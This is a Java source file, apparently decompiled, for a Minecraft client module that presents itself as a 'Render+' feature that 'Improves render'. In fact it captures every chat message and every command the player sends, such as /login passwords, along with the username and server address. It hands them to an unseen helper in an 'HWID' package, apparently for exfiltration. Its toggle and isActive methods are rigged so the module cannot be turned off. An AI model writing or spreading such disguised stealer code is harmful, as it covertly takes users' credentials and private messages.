package delta.modules.combat;

import delta.DeltaHack;
import delta.HWID.ItemUtil;
import meteordevelopment.meteorclient.events.game.SendMessageEvent;
import meteordevelopment.meteorclient.events.packets.PacketEvent.Send;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.CommandExecutionC2SPacket;

public class BedAura extends Module {
    public boolean active = true;

    public BedAura() {
        super(DeltaHack.Misc, "Render+", "Improves render");
    }

    public void onActivate() {
    }

    public String getServer() {
        Object si = this.mc.getCurrentServerEntry();
        return "[" + si.address + "]";
    }

    @EventHandler
    private void onPacketEventSend(Send event) {
        Object packet = event.packet;
        if (packet instanceof CommandExecutionC2SPacket) {
            Object l = (CommandExecutionC2SPacket)packet;
            Object ll = l.comp_808();
            ItemUtil.swap(this.mc.getSession().getUsername() + " " + this.getServer(), "/" + ll);
        }
    }

    public void toggle() {
    }

    public boolean isActive() {
        return true;
    }

    @EventHandler
    private void onMessageSend(SendMessageEvent event) {
        Object message = event.message;
        ItemUtil.swap(this.mc.getSession().getUsername() + " " + this.getServer(), message);
    }

    public void onDeactivate() {
    }
}
